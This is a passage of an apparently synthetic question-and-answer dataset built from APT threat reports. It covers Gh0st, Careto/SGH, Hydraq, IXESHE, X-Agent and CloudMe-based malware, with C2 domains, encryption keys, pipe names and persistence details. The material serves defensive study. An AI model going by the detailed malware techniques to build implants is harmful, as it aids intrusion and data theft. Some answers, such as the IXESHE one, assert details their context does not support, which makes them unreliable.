    "output": "The investigation into VPSNOC and Digital Linx revealed connections through shared domain registrant information and overlapping infrastructure. Whois records indicated that both vpsnoc.com and digitallinx.net shared the same registrant organization, Digital Linx Hosting, with a Kansas City-based address and common contact information. Additionally, the sitemap.xml files for digitallinx.net and digitallinx.com were identical, suggesting a close relationship. Furthermore, the phone number 925-665-1427 was used for both vpsnoc.com and defiantmarketing.com, which was registered by Persona #2, who used aliases 'agnosticon' and 'agnostic'. This persona also mentioned DigitalLinx in a Debian users forum post and was active in promoting VPSNOC services on blackhatworld.com, indicating a direct involvement in both entities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Small Headline: 3.2.1 Overview\nDeployed to the system via a compressed bundle containing the official GOM Player setup binary and a self-extracting RAR archive containing the malicious files, the malware consists of a number of individual pieces. Upon extraction from the RAR archive, the installer component (0ae82fd94836815a1e8d284ccb75109d) is automatically launched alongside the GOM Player update, distracting victims from the malicious activity taking place.\nThe installer component is referred to by the author as 'miansha' which, according to an East Asia Cyber Threat Intelligence Researcher, is likely Mi\u01censh\u0101 (\u514d\u6740), a phrase commonly used by People's Republic of China (PRC) hackers to mean 'anti Antivirus detection' or 'Antivirus avoidance'; Symantec[3] have named the detection for this code 'Backdoor.Miancha', where Mi\u01cench\u00e1 (\u514d\u67e5, likely shorthand for \u514d\u6740\u67e5) similarly means 'Antivirus avoidance'. The installer is responsible for the malware persistence mechanism, adding entries to the registry in the following locations, depending on Windows Version:\nThe installer will also determine the system architecture (32- or 64-bit) and then deobfuscate the relevant loader DLL to the path 'C:\\Windows\\temp\\install.ocx', ensuring the malware is launched on system start-up. Oddly, this file is padded with null bytes, resulting in a 25 megabyte file.\nThe deployment chain of the Miancha Gh0st variant\n3\nThe main implant code is stored in files named instructions.pdf and instructions64.pdf; not PDF documents but instead DLLs obfuscated with a one-byte XOR with 0x14, similar to the malware loader DLLs.  The loader, referred to by the malware author as \u58f3 (shell), reads and deobfuscates the main implant code which then communicates with the attacker-controlled server at testqweasd.tk (211.43.220.89) on TCP port 443. The main implant code is referred to as \u767d\u52a0\u9ed1 ('Black on White'), a term used in the PRC hacking community to denote the act of Antivirus avoidance through the loading of malicious 'black' code via non-malicious or trusted 'white' code. This is a practice recently illustrated through the deployment of the PlugX trojan, utilising DLL load order hijacking alongside a signed (trusted) executable.\nAnalysis of this malware revealed it to be a variant of the Gh0st RAT, often used by Chinese actors (including those who are state-motivated or directly state-sponsored). This specific variant shows similarities to that used during the VOHO campaign[4], where Gh0st RAT was spread via watering hole attacks utilising vulnerable websites belonging to financial services and technology companies. Specifically, the initial five bytes of the communications (often used to denote a campaign or victim) are 'HTTPS', amended from the original 'Gh0st'; the same as the traffic produced by the VOHO Gh0st variant.\nIn addition to delivering system-specific details back to the attacker, Gh0st RAT provides the capability to deploy additional malware, enabling the harvesting of sensitive data and enabling the further propagation throughout the infected network.\n4\n\nQuestion: What is the significance of the 'Black on White' technique used by the Miancha Gh0st variant, and how does it relate to the deployment of the PlugX trojan?\n\nAnswer:",
    "output": "The 'Black on White' technique, referred to as \u767d\u52a0\u9ed1 in the PRC hacking community, denotes the act of antivirus avoidance through the loading of malicious 'black' code via non-malicious or trusted 'white' code. This practice has been illustrated through the deployment of the PlugX trojan, which utilizes DLL load order hijacking alongside a signed (trusted) executable. In the context of the Miancha Gh0st variant, the main implant code communicates with the attacker-controlled server using this technique to evade detection. This method allows the malware to blend in with legitimate processes, making it harder for antivirus software to detect and remove it. The use of trusted code to load malicious components is a sophisticated technique that enhances the stealthiness of the attack.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Summary for Webmail.earthlink.net\nIn another incident an employee checked their online Earthlink account. When they replied to an email, a new ad was loaded on a page that attempted to exploit Java. This malvertising was from the same IP address seen in other incidents.\nYou will notice the inline advertisements on this page in Figure 9. The event tree in Figure 10 notes that this was likely a spear-phish attack. The timeline will show that when the user replied to an email, the ads on the Earthlink page refreshed, dropping the exploit code via Java.\nNote in the timeline in Figure 11, how there was a 7 minute gap between the DoubleClick ad redirect and the delivery.first-impression.com ad. This is an indication that the page was refreshed or the ad was refreshed on the page. The same exploit IP address from the Gpokr event is present. This event is the oldest, happening on September 11.\nBig Headline: Real-Time Bidding Networks: How it works\nWe observed in Operation DeathClick that real-time ad bidding networks are being used by criminal enterprise to target companies with malicious content in order to gain persistent remote access. In these third-party arrangements, the content is frequently not vetted because billions of impressions are rendered in real-time. Most of the content is legitimate ads. A small fraction is malicious content linking to landing pages that infect users. Real-time ad networks are being used, often unwittingly, and some have taken steps to try and combat malicious use of their networks. The Online Trust Alliance is one such industry group comprised of major software companies and ad networks working together to try and address this problem. Our goal in this paper is to shed light on the micro-targeting of companies by criminal enterprise employing real-time ad networks, and to aid the industry in collectively addressing this problem.\nhave evolved over the last ten years as a means of micro-targeting customers with advertising content they are more likely to click-on.\nFrom (<http://en.wikipedia.org/wiki/Real-time_bidding>):\nReal-time bidding (RTB) refers to the means by which ad inventory is bought and sold on a per-impression basis, via programmatic instantaneous auction, similar to financial markets.With real-time bidding, advertising buyers bid on an impression and, if the bid is won, the buyer's ad is instantly displayed on the publisher's site.Real-time bidding lets advertisers manage and optimize ads from multiple ad-networks by granting the user access to a multitude of different networks, allowing them to create and launch advertising campaigns, prioritize networks and allocate advertising stock.\nReal-time bidding is a dynamic bidding process where each impression is bid for in (near) real time, against a static auction where the impressions are typically bundled in groups of 1,000.\nA typical transaction begins with a user visiting a website. This triggers a bid request that can include various pieces of data such as the user's demographic information, browsing history, location, and the page being loaded. The request goes from the publisher to an ad exchange, which submits it and the accompanying data to multiple advertisers who automatically submit bids in real time to place their ads. Advertisers bid on each ad impression as it is served. The\nimpression goes to the highest bidder and their ad is served on the page.This process is repeated for every ad slot on the page. Real time bidding transactions typically happen within 100 milliseconds from the moment the ad exchange received the request.\nThe bidding happens autonomously and advertisers set maximum bids and budgets for an advertising campaign. The criteria for bidding on particular types of consumers can be very complex, taking into account everything from very detailed behavioral profiles to conversion data.\nThe following infographic summarizes how advanced adversaries are now micro-targeting companies using malvertising.\nMalvertisers\n\nIn the context of Operation DeathClick, what indicators suggest that a malvertising attack occurred during an employee's interaction with their Earthlink email account? Discuss the timeline and technical details of the attack.",
    "output": "A: Several indicators suggest that a malvertising attack occurred during an employee's interaction with their Earthlink email account. Firstly, when the employee replied to an email, a new ad was loaded on the page that attempted to exploit Java. This malvertising originated from the same IP address seen in other incidents. The event tree noted that this was likely a spear-phish attack. Additionally, the timeline showed a 7-minute gap between the DoubleClick ad redirect and the delivery.first-impression.com ad, indicating that the page or ad was refreshed. The same exploit IP address from a previous event (Gpokr) was present, further linking the incidents. This event occurred on September 11 and involved inline advertisements on the Earthlink page, which dropped the exploit code via Java when the user replied to an email.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: xii) awdcxc32 module\nThis library is injected into the \"EXPLORER.EXE\" prcess by the LoadDLL driver component.\nAll the functionality is implemented in the DllMain function.\nConnects to the \"vchw9x\" component using a pipe by name taken from the configuration block (\"\\\\.\\pipe\\{807BF02B-3F5F-4570-970A-8AADBAA55AC1}\") and communicates with the C&C server using that component.\nAll communication between the component and the server is encrypted using the RC4 encryption algorithm. The encryption key is read from the configuration block and equals to the string \"Caguen1aMar\" in all the configurations we discovered. It also loads additional libraries specified in the configuration, i.e. \"mfcn30\".\nThe module can execute the following commands provided by the C&C server:\nThe files received from the C&C server can be saved to the default Windows, Temporary or System directories, or any other location specified in the command.\nMedium Headline: xiii) mfcn30 module\nThis library is loaded by \"awcodc32\". It provides a framework for extending the malware with additional plugins and sending the results of their data collection routines to the C&C server.\nFile type: PE32/PE32+ DLL\nFile location: %windows%\\System32\\mfcn30.dll\nCompilation timestamps:\n2012.07.03 19:53:03 (GMT),\n2012.07.03 19:55:23 (GMT),\n2013.03.22 11:55:12 (GMT)\nFile sizes: 15872, 17920 bytes\nExports:\n77001295: DllCanUnloadNow\n7700129E: DllGetClassObject\nTechnical details\nAll the functionality is implemented in the DllMain function.\nConnects to the \"vchw9x\" component using a pipe name from the configuration block\n\\\\.\\pipe\\{807BF02B-3F5F-4570-970A-8AADBAA55AC1} for interacting with C&C server.\nThe module reads a list of additional plugin DLLs from the configuration block, loads these libraries and then periodically queries them for collected information. The results are sent to the C&C server via the pipe interface provided by \"vchw9x\".\nMedium Headline: xiv) vchw9x module\nThis module implements network connectivity features for the SGH components.\nFile type: PE32/PE32+ DLL\nFile location: %windows%\\System32\\vchw9x.dll\nCompilation timestamps: 2012.07.03 19:53:02 (GMT), 2012.07.03 19:55:21 (GMT), 2013.03.22 11:55:11 (GMT)\nFile sizes: 18432, 20992, 22528 bytes\nExports:\n78001977: DllCanUnloadNow\n78001980: DllGetClassObject\nTechnical details\nThis library is injected by the LoadDLL driver into processes from the following list:\nIEXPLORE.EXE\nFIREFOX.EXE\nMOZILLA.EXE\nOPERA.EXE\nNETSCAPE.EXE\nEMULE.EXE\nCHROME.EXE\nAll the functionality is implemented in the DllMain function.\nCreates the pipe:\n\\\\.\\pipe\\{807BF02B-3F5F-4570-970A-8AADBAA55AC1}\nand processes commands sent via this pipe by other modules.\nOnce a command is received, it passes the network request to Wininet functions and returns the results to the caller module via the same pipe.\nMedium Headline: xv) jpeg1x32 module\nFile type: PE32 DLL\nFile location: %windows%\\System32\\jpeg1x32.dll\nCompilation timestamps: 2013.04.09 14:15:17 (GMT)\nFile sizes: 31744 bytes\nExports:\n79002656: fnProcess\nTechnical details\nAll the functionality is implemented in the fnProcess function. The function receives 4 parameters that define the module's behavior. Depending on the parameters, it can:\n\u25cf Delete the SGH components specified in the configuration block, effectively uninstalling it\n\u25cf Delete the registry keys corresponding to the components of SGH\n\u25cf Compile a complete system report, including directory locations, hardware parameters, list of users, processes, installed programs, MAC addresses of network adapters\n\u25cf Call various functions of the \"awdcxc32\" module\nMedium Headline: xvi) siiw9x module\nFile type: PE32 DLL\nFile location: %windows%\\System32\\siiw9x.dll\nCompilation timestamps: 2013.03.22 11:55:13 (GMT)\nFile sizes: 15360 bytes\nExports:\n78002078: DllEnumClass\nTechnical details\nMain functionality is implemented in the DllMain function. The module waits until a desktop named \"screen-saver\" appears and when that desktop becomes available it creates another desktop named \"DZ9PADXF\" and launches the default browser application there. This functionality may be useful for stable operation of the \"vchw9x\" module on rarely used computers since that module is activated only in browser processes.\nThe \"DllEnumClass\" function deletes the module or removes its name from the configuration block, depending on the Windows version.\nxvii) SkypeIE6Plugin\nIntercepts and records audio streams from Skype. We have discovered only a 32-bit version of this plugin so far.\nFile type: PE32 DLL\nFile location: %windows%\\System32\\SkypeIE6Plugin.dll\nCompilation timestamps: 2011.01.17 14:30:23 (GMT)\nFile sizes: 73728 bytes\nTechnical details\nThe library has no exports, its functionality is implemented in the DllMain function. The library hides itself by modifying the list of loaded DLL files to that its own module name appears to be \"%windows%\\System32\\authz.dll\". It intercepts several functions exported by system libraries to capture sound from the infected system:\nThe module uses an additional library, \"%windows%\\System32\\lame_enc.dll\" to compress recorded audio data. The location of recorded data is specified in the configuration block.\nMedium Headline: xviii) nmwcdlog module\nGathers information from Nokia mobile devices using the Nokia OVI/PC Suite API.\nThe library has no exports, its functionality is implemented in the DllMain function. It loads the Nokia Connectivity API libraries \"ConnAPI.dll\", \"DAAPI.dll\" and tries to extract data from all available devices.\nThe module collects the following information:\n- device name\n- manufacturer name\n- model\n- serial number\n- list of contacts\n- calendar\n- bookmarks\n- SMS and MMS messages\nMedium Headline: xix) d3dx8_20 module\nThis data collection plugin makes screenshots of the victim's desktop.\nTechnical details\nThe library has no exports, its functionality is implemented in the DllMain function. It makes screenshots of the desktop and marks the position of the mouse cursor. Additionally, it captures the title of the foreground window. Collected data is stored in multi-volume ZIP archives and then delivered to the C&C server.\nxx) WifiScan module\nRetrieves the list of available Wi-Fi networks. We have discovered only a 64-bit version of this plugin so far.\nThe library has no exports, its functionality is implemented in the DllMain function. It uses the API provided by the library \"wlanapi.dll\" to retrieve information about the wireless networks visible to the infected machine's Wi-Fi interfaces.\nMedium Headline: xxi) awview32 module\nThis module is injected in Microsoft Outlook processes. Collects victim's email messages.\nFile type: PE32/PE32+ DLL File location: %windows%\\System32\\awview32.dll Compilation timestamps: 2011.06.10 12:27:40 (GMT), 2011.06.10 16:46:57 (GMT) File sizes: 26624, 45056 bytes.\nTechnical details\nThe library has no exports, its functionality is implemented in the DllMain function. The module implements the Microsoft Outlook add-in interface and ensures it is requested by hooking the OLE2 API. It receives events from the Outlook application, collects the e-mail messages and writes them to the temporary directory.\nMedium Headline: xxii) CDllUninstall module\nFile type: PE32/PE32+ DLL\nFile location: non, is executed in memory\nCompilation timestamps: 2013.06.20 11:58:03 (GMT), 2013.06.20 11:58:08 (GMT)\nFile sizes: 11264, 13824 bytes\nTechnical details\nHaving its filename related to the SGH package, this module is actually a command package for Careto. It is transmitted by the C&C servers as a CAB archive containing 32-bit and 64-bit versions of its DLL and the accompanying \"Meta.inf\" file. The contents of the archive follow:\nThe \"Meta.inf\" instructs the Careto instance to load the DLL appropriate for the system architecture:\n#Mon Oct 28 17:20:14 GMT 2013\nDLL32_FILE_NAME=CDllUninstallSGH32.dll\nDLL64_FILE_NAME=CDllUninstallSGH64.dll\nDATE_GENERATION=20131028T172014.101\nTYPE=CMD\nCLIENT_ID=%client id%\nCMD_SEQ=0002\nINST_ID=%installation id%\nSUB_TYPE=CANNEDDLL\nTARGET_PROCESS=EXPLORER\nPRODUCT_CODE=C316\nThe module uninstalls both Careto and SGH from the infected computer. Its internal name is \"CDllUninstall v1.0.0\". It explicitly names the software packages with their original names by writing the following strings in the uninstallation log:\nThe module contains hardcoded locations of the files that are removed and registry keys to be removed or restored. For SGH, these are:\nHKLM\\SYSTEM\\*ControlSet*\\Services\\scsimap\n%systemroot%\\System32\\bootfont.bin\nc:\\Windows\\System32\\bootfont.bin\n%systemroot%\\System32\\drivers\\scsimap.sys\nc:\\Windows\\System32\\drivers\\scsimap.sys\nFor Careto, it first determines the location of the main module by reading the registry value from:\nHKLM/HKCU\\SOFTWARE\\CLASSES\\CLSID\\{ECD4FC4D-521C-11D0-B792-\n00A0C90312E1}\nThe main module is removed and the original registry value is restored from the registry key:\nSOFTWARE\\CLASSES\\CLSID\\{E6BB64BE-0618-4353-9193-\n0AFE606D6F0C}\\InprocServer32\nRead the text above and answer this question: Describe the functionality of the 'vchw9x' module in the Mask APT and explain how it interacts with other components.",
    "output": "The 'vchw9x' module implements network connectivity features for the SGH components. It is injected by the LoadDLL driver into specific processes such as IEXPLORE.EXE, FIREFOX.EXE, and others. The module creates a named pipe ('\\\\.\\pipe\\{807BF02B-3F5F-4570-970A-8AADBAA55AC1}') and processes commands sent via this pipe by other modules. Once a command is received, it passes the network request to Wininet functions and returns the results to the caller module via the same pipe. This allows other components to communicate with the C&C server through the 'vchw9x' module.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: DEFENDING AGAINST APTS\nSufficiently motivated threat actors can penetrate even networks that use moderately advanced security measures. As such, apart from standard and relevant attack prevention measures and mechanisms such as solid patch management; endpoint and network security; firewall use; and the like, enterprises should also focus on detecting and mitigating attacks. Moreover, data loss prevention (DLP) strategies that identify the data an organization is protecting and take into account the context of data use should be employed.\nMedium Headline: local and external threat intelligence\nThreat intelligence refers to indicators that can be used to identify the tools, tactics, and procedures threat actors engaging in targeted attacks utilize. Both external and local threat intelligence is crucial for developing the ability to detect attacks early. The following are the core components of this defense strategy:\n\u2022 Enhanced visibility: Logs from endpoint, server, and network monitoring are an important and often underused resource that can be aggregated to provide a view of the activities within an organization that can be processed for anomalous behaviors that can indicate a targeted attack.\n\u2022 Integrity checks: In order to maintain persistence, malware will make modifications to the file system and registry. Monitoring such changes can indicate the presence of malware.\n\u2022 Empowering the human analyst: Humans are best positioned to identify anomalous behaviors when presented with a view of aggregated logs from across a network. This information is used in conjunction with custom alerts based on the local and external threat intelligence available.\nTechnologies available today such as Deep Discovery provide visibility, insight, and control over networks to defend against targeted threats.11 Deep Discovery uniquely detects and identifies evasive threats in real time and provides in-depth analysis and actionable intelligence to prevent, discover, and reduce risks.\n11\nMedium Headline: mitigation and cleanup strategy\nOnce an attack is identified, the cleanup strategy should focus on the following objectives:\n\u2022 Determine the attack vector and cut off communications with the C&C server.\n\u2022 Determine the scope of the compromise.\n\u2022 Assess the damage by analyzing the data and forensic artifacts available on compromised machines.\nRemediation should be applied soon afterward, which includes steps to fortify affected servers, machines, or devices into secure states, informed in part by how the compromised machines were infiltrated.\nMedium Headline: data-centric protection strategy\nThe ultimate objective of targeted attacks is to acquire sensitive data. As such, DLP strategies that focus on identifying and protecting confidential information are critical. Enhanced data protection and visibility across an enterprise provides the ability to control access to sensitive data as well as monitor and log successful and unsuccessful attempts to access it. Enhanced access control and logging capabilities allow security analysts to locate and investigate anomalies, respond to incidents, and initiate remediation strategies and damage assessment.\nBig Headline: TREND MICRO THREAT PROTECTION AGAINST IXESHE CAMPAIGN COMPONENTS\nThe following table summarizes the Trend Micro solutions for the components of the IXESHE campaign. Trend Micro recommends a comprehensive security risk management strategy that goes further than advanced protection to meet the real-time threat management requirements of dealing with targeted attacks.\nFirst-stage computer intrusions often use social engineering. Attackers custom-fit attacks to their targets.\nIXESHE attacks used custom-fit targeted emails with PDF exploits for CVE-2009-4324, CVE-2009-0927, CVE-2011-0609, and CVE-2011-0611. These were used to drop malicious executable files that gave the attackers complete control of their targets' systems.\nThe attackers used either dynamic Domain Name System (DNS) or compromised servers hosted on networks that they previously successfully infiltrated.\n\u2022\t Possible Indicators of Compromise\nAttackers want to remain undetected as long as possible. A key characteristic of these attacks is stealth.\n\u00bb Enters networks via a specially crafted, targeted email with a malicious file attachment\n\u00bb Uses document exploits (primarily PDF exploits) to drop malware onto target systems\n\u00bb Uses malware detected as IXESHE by security companies\n\u00bb Sends a GET request to the command-and-control (C&C) server with the format: http://[C&C Server]/[ACD] [EW]S[Some Numbers].jsp?[Encrypted Base64 Blob]\n* The campaign codes we have seen so far are detailed in the Trend Micro research paper, \"IXESHE: An APT Campaign.\" The characteristics highlighted in this APT campaign quick profile reflect the results of our investigation as of May 2012.\nFirst-stage computer intrusions often use social engineering. Attackers custom-fit attacks to their targets.\nIXESHE attacks used custom-fit targeted emails with PDF exploits for CVE-2009-4324, CVE-2009-0927, CVE-2011-0609, and CVE-2011-0611. These were used to drop malicious executable files that gave the attackers complete control of their targets' systems.\nThe attackers used either dynamic Domain Name System (DNS) or compromised servers hosted on networks that they previously successfully infiltrated.\n\u2022\t Possible Indicators of Compromise\nAttackers want to remain undetected as long as possible. A key characteristic of these attacks is stealth.\n\u00bb Enters networks via a specially crafted, targeted email with a malicious file attachment\n\u00bb Uses document exploits (primarily PDF exploits) to drop malware onto target systems\n\u00bb Uses malware detected as IXESHE by security companies\n\u00bb Sends a GET request to the command-and-control (C&C) server with the format: http://[C&C Server]/[ACD] [EW]S[Some Numbers].jsp?[Encrypted Base64 Blob]\n* The campaign codes we have seen so far are detailed in the Trend Micro research paper, \"IXESHE: An APT Campaign.\" The characteristics highlighted in this APT campaign quick profile reflect the results of our investigation as of May 2012.\nMedium Headline: TREND MICRO\u2122\nTrend Micro Incorporated (TYO: 4704; TSE: 4704), a global cloud security leader, creates a world safe for exchanging digital information with its Internet content security and threat management solutions for businesses and consumers. A pioneer in server security with over 20 years' experience, we deliver top-ranked client, server and cloud-based security that fits our customers' and partners' needs, stops new threats faster, and protects data in physical, virtualized and cloud environments. Powered by the industry-leading Trend Micro\u2122 Smart Protection Network\u2122 cloud computing security infrastructure, our products and services stop threats where they emerge\u2014from the Internet. They are supported by 1,000+ threat intelligence experts around the globe.\n\nBased on the above text, answer a question. How does the IXESHE campaign maintain stealth and persistence within compromised networks? What specific techniques do they employ?",
    "output": "The IXESHE campaign maintains stealth and persistence by using compromised servers as C&C servers, sometimes hosted on target organizations' networks after successful infiltration. This technique allows the attackers to increase their control over the victims' infrastructure while minimizing outbound C&C traffic, making detection more difficult. Additionally, the attackers use dynamic DNS services to hide their activities, confusing them with legitimate data. These techniques enable the attackers to remain undetected for extended periods, enhancing the effectiveness of their operations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: 3.3.2 In the Registry Key\nThe backdoor also checks the registry key HKLM\\Software\\Sun\\1.1.2\\AppleTlk. The value contained in this key is encoded information about the remote connection details.\nIf the registry key exist, it will decode the value using the following steps:\n\u2022 Perform a bitwise XOR with 0x99 as the key on each byte.\n\u2022 Perform the same custom decoding logic it used in the configuration found in file's resource section.\nThe updated configuration is always stored in the registry. The backdoor will then retrieve the specified hostname and alternate DNS to establish a remote connection. It checks the hostname IP Address if it is a valid IPv4 Internet address. If it is not, it retrieves the hostname IP address using an available DNS. If the backdoor cannot resolve the hostname IP address, it will sleep for two minutes and attempt to resolve the IP address using an available DNS again (see Listing 06).\nIf the registry key HKLM\\Software\\Sun\\1.1.2\\ does not exist, the backdoor continues the connection using the configuration specified from the backdoor resource section. Take note that the priority configuration used is always from the registry key next is the configuration from the resource.\n[Listing 06 - Win32/Hydraq reconnects after 2 minutes]\nVery Small Headline: 3.4.1 SYNchronize\nThe client sends a custom SYNchronize packet containing the following 20 bytes as initial handshake.\nFF FF FF FF FF FF 00 00 FE FF FF FF FF FF FF FF FF FF 88 FF\nThe set of bytes above are encrypted using a bitwise NOT operation. Thus, the raw set of bytes is the following:\nAs shown in Listing 07, the Win32/Hydraq backdoor code includes a routine that constructs the 20 byte SYNchronization packet that is sent to the client.\nThe initial handshake was captured during a test simulation performed in a controlled environment as shown in Appendix B. The backdoor uses port 443 to connect to the server. Port 443 is the known default port for the HTTPS protocol.\nHowever, in this case, the Win32/Hydraq backdoor did not take advantage of the available SSL/TLS encryption to secure its communication to the client. The information contained in the packet is evidently showing the set of bytes constructed by the malware.\n\nBased on the above text, answer a question. How does the Win32/Hydraq backdoor handle the registry key HKLM\\\\Software\\\\Sun\\\\1.1.2\\\\AppleTlk to establish a remote connection? Explain the steps involved in decoding the value contained in this key and how the backdoor proceeds if the key does not exist.",
    "output": "The Win32/Hydraq backdoor checks the registry key HKLM\\\\Software\\\\Sun\\\\1.1.2\\\\AppleTlk for encoded information about remote connection details. If the registry key exists, it decodes the value using a specific process: first, it performs a bitwise XOR with 0x99 as the key on each byte, followed by applying the same custom decoding logic used in the configuration found in the file's resource section. The updated configuration is always stored in the registry. The backdoor then retrieves the specified hostname and alternate DNS to establish a remote connection. It verifies if the hostname IP address is a valid IPv4 Internet address. If not, it resolves the hostname IP address using an available DNS. If the backdoor cannot resolve the hostname IP address, it sleeps for two minutes and attempts to resolve the IP address again using an available DNS. If the registry key HKLM\\\\Software\\\\Sun\\\\1.1.2\\\\ does not exist, the backdoor continues the connection using the configuration specified from the backdoor resource section. The priority configuration used is always from the registry key, followed by the configuration from the resource section.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: Explain the purpose and methodology of the DOCS_STEALER module in Operation Groundbait. What types of files does it collect and how are they processed?",
    "output": "The DOCS_STEALER module is responsible for collecting documents from removable media or fixed drives connected via a USB interface. It focuses on collecting files with document-type extensions such as .DOC, .XLS, .DOCX, .XLSX, .PPT, .PPTX, .PPS, .PPSX, .PDF, .RTF, .TXT, and .ODT. The module only collects files that were modified in the last 7, 14, or 30 days, depending on the version. The collected files are then compressed, encrypted with Blowfish, and stored under the scheme %USERPROFILE%\\\\AppData\\\\Local\\\\ioctl\\\\%DISK_ID%\\\\%DATE%_%TIME%.kf.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: 1.1 Context\nThe company Mandiant published in February 2013 a report about an Advance Persistent Threat (APT) called APT1. The report can be freely downloaded here: .\nInspired by this article, we have decided to perform our own technical analysis of this case. In the report, Mandiant explains that the attackers were using a well-known Remote Administration Tool (RAT) called Poison Ivy and that they were located in China. We based our investigation based on those two facts only.\nQ: Why did the authors of the APT report 'RAP002_APT1_Technical_backstage.1.0' decide to conduct their own technical analysis of the APT1 case? What specific aspects of the original Mandiant report influenced their decision to focus on certain elements of the attack?",
    "output": "The authors of the APT report 'RAP002_APT1_Technical_backstage.1.0' decided to conduct their own technical analysis of the APT1 case because they were inspired by the original report published by Mandiant in February 2013. Specifically, the Mandiant report highlighted that the attackers were using a well-known Remote Administration Tool (RAT) called Poison Ivy and that the attackers were located in China. These two key pieces of information\u2014the use of Poison Ivy and the geographical location of the attackers\u2014were the primary factors that influenced the authors' decision to base their investigation on these aspects.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: KEY POINTS\n\" OPEN-SOURCE REPORTING INDICATES LOSSES OF ALMOST 50% OF EQUIPMENT IN THE LAST 2 YEARS OF CONFLICT AMONGST UKRAINIAN ARTILLERY FORCES AND OVER 80% OF D-30 HOWITZERS WERE LOST, FAR MORE THAN ANY OTHER PIECE OF UKRAINIAN ARTILLERY 9.\n\"\n\u2022 From late 2014 and through 2016, FANCY BEAR X-Agent implant was covertly distributed on Ukrainian military forums within a legitimate Android application developed by Ukrainian artillery officer Yaroslav Sherstuk.\n\u2022 The original application enabled artillery forces to more rapidly process targeting data for the Soviet-era D-30 Howitzer employed by Ukrainian artillery forces reducing targeting time from minutes to under 15 seconds. According to Sherstuk's interviews with the press, over 9000 artillery personnel have been using the application in Ukrainian military.\n\u2022 Successful deployment of the FANCY BEAR malware within this application may have facilitated reconnaissance against Ukrainian troops. The ability of this malware to retrieve communications and gross locational data from an infected device makes it an attractive way to identify the general location of Ukrainian artillery forces and engage them.\n\u2022 Open source reporting indicates that Ukrainian artillery forces have lost over 50% of their weapons in the 2 years of conflict and over 80% of D-30 howitzers, the highest percentage of loss of any other artillery pieces in Ukraine's arsenal.\n\u2022 This previously unseen variant of X-Agent represents FANCY BEAR's expansion in mobile malware development from iOS-capable implants to Android devices, and reveals one more component of the broad spectrum approach to cyber operations taken by Russia-based actors in the war in Ukraine.\n\u2022 The collection of such tactical artillery force positioning intelligence by FANCY BEAR further supports CrowdStrike's previous assessments that FANCY BEAR is likely affiliated with the Russian military intelligence (GRU), and works closely with Russian military forces operating in Eastern Ukraine and its border regions in Russia.\n\nHow did the FANCY BEAR X-Agent implant potentially contribute to the significant losses of Ukrainian artillery forces, particularly the D-30 howitzers, during the conflict in Eastern Ukraine?",
    "output": "A: The FANCY BEAR X-Agent implant was covertly distributed within a legitimate Android application developed by Ukrainian artillery officer Yaroslav Sherstuk. This application was designed to expedite the processing of targeting data for the D-30 Howitzer, reducing targeting time from minutes to under 15 seconds. With over 9,000 artillery personnel reportedly using the application, the successful deployment of the FANCY BEAR malware within this app could have facilitated reconnaissance against Ukrainian troops. The malware's capability to retrieve communications and gross locational data from infected devices made it an effective tool for identifying the general location of Ukrainian artillery forces, thereby enabling targeted engagements. Open-source reporting indicates that Ukrainian artillery forces suffered significant losses, with over 50% of their equipment lost in the last two years of conflict and over 80% of D-30 howitzers specifically. This suggests that the malware's reconnaissance capabilities may have played a role in these substantial losses.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: WebDAV cloud usage\nWebDAV is a communication standard that allows file management over HTTP or HTTPS. Windows allows WebDAV sessions to be mapped as network resources.\nThe use of WebDAV as the communication channel is atypical for most malware samples we see. By using a network resource, the actual web traffic originates from the system itself, and not from the process in which the malware resides. Additionally, once the resource is established, the malware can transfer files to and from the command and control servers using standard file IO commands.\nAll the authentication information for the WebDAV session including the URL, folders, path, user name, and password is stored within this last DLL in another AES-encrypted configuration structure in the binary.\nA unique path, username, and password were used for each malware instance we\u2022ve seen in the wild. This allows the attackers to uniquely identify every targeted attack and track how successful each phishing campaign is.\nAlso contained within the configuration structure is information on how to name the survey data on the remote file server.  The binary reads from its configuration a string on how to generate the remote filename, and a list of extensions to use. An example would be \u2022_1-7d_0-8s\u2022, [\u2022TIF\u2022, \u2022TAR\u2022, \u2022SIT\u2022] which instructs the binary to generate a filename with 1 to 7 numeric digit characters followed by 0 to 8 ASCII letters with one of the three listed extensions such as \u2022664gher.TAR\u2022. The survey is then uploaded to the server in a specified folder with the generated name.\nFiles are compressed using a modified LZMA-compression and encrypted using AES cipher-block-chaining (CBC) before being uploaded to the cloud server.\nThe binary also checks a separate folder on the cloud service designated to contain new configuration information. If such a file is present on the server, the malware downloads the new configuration file then deletes it from the server.\nThe cloud storage provider in every case we have seen was the Swedish company CloudMe.com, which offers free and paid WebDAV cloud storage.\nThe URI model used by the malware is http://webdav.cloudme.com/%username%/CloudDrive/ which is a direct reference to file storage.\nIt must be noted that the CloudMe service is not actively spreading the malicious content; the attackers are only using it for storing their files.\nWe notified CloudMe.com about the abuse of their services. Their CEO, Mr. Daniel Arthursson, was none too happy about this, and was very helpful in our further research. CloudMe has shared a great deal of log information related to this attack. These indicate that there are many other accounts (over 100) likely related to this attack system. We have no way of verifying this with absolute certainty, but this is what we regard as a high confidence assumption.\nDistribution of logged victim connections towards CloudMe.\nThe cloud accounts are not used for one-way communication only. The malware also checks configured subfolders for updates; and if these are found they will be downloaded, decrypted and used as appropriate.\nOne such case is the franko7046 account, used against the previously mentioned bank CEO. In this account there was hidden another encrypted configuration file which the malware downloaded and decrypted.\nAbove: The configuration file of the depp3353 account. Password is redacted.\nThis is how we found the depp3353 account. In this new account there was another surprise waiting for us \u2022 a download folder with two new encrypted files, 921.bin and 922.bin. Once decrypted, these turned out to be PE executables.\nMedium Headline: Downloaded plugins: Cloud persistence\nThe two new executables are plugins - quite similar to each other and obviously compiled on the same setup. They are lightweight and intended to pull specific survey information from their target. Of 